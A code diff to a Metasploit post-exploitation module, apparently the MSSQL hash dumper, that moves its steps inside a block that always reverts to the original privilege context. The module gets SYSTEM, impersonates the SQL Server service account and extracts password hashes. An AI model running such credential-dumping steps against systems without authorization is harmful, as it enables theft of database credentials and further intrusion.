@@ -47,23 +47,25 @@ class Metasploit3 < Msf::Post
     system_status = get_system
     fail_with(Exploit::Failure::Unknown, 'Unable to get SYSTEM') unless system_status
 
-    service = check_for_sqlserver(instance)
-    fail_with(Exploit::Failure::Unknown, 'Unable to identify MSSQL Service') unless service
-
-    print_status("Identified service '#{service[:display]}', PID: #{service[:pid]}")
-    instance_name = service[:display].gsub('SQL Server (','').gsub(')','').lstrip.rstrip
-
     begin
-      get_sql_hash(instance_name)
-    rescue RuntimeError
-      # Attempt to impersonate sql server service account (for sql server 2012)
-      if impersonate_sql_user(service)
-        get_sql_hash(instance_name)
-      end
-    end
+      service = check_for_sqlserver(instance)
+      fail_with(Exploit::Failure::Unknown, 'Unable to identify MSSQL Service') unless service
 
-    # return to original priv context
-    session.sys.config.revert_to_self
+      print_status("Identified service '#{service[:display]}', PID: #{service[:pid]}")
+      instance_name = service[:display].gsub('SQL Server (','').gsub(')','').lstrip.rstrip
+
+      begin
+        get_sql_hash(instance_name)
+      rescue RuntimeError
+        # Attempt to impersonate sql server service account (for sql server 2012)
+        if impersonate_sql_user(service)
+          get_sql_hash(instance_name)
+        end
+      end
+    ensure
+      # return to original priv context
+      session.sys.config.revert_to_self
+    end
   end
 
   def get_sql_version(instance_name)
